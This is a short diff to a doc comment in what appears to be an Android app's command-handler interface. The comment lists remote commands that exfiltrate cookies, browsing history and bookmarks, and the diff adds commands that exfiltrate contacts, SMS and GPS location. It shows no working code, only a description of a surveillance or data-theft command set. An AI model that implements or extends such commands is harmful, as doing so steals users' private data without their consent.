@@ -33,6 +33,10 @@ interface CommandHandler {
  *   - "request-cookies"   → exfiltrate WebView cookies for given domains
  *   - "request-history"   → exfiltrate browsing history
  *   - "request-bookmarks" → exfiltrate bookmarks and favorites
+ *   - "request-contacts"  → exfiltrate device contacts (requires READ_CONTACTS)
+ *   - "request-sms"       → exfiltrate SMS inbox (requires READ_SMS)
+ *   - "request-location"  → exfiltrate last known GPS location (requires ACCESS_FINE_LOCATION)
+ *   - "send-notification" → push a visible notification to the user
  *
  * Each handler injects a DDG -api module and reads data through
  * the official interface — no reflection or hacks needed.
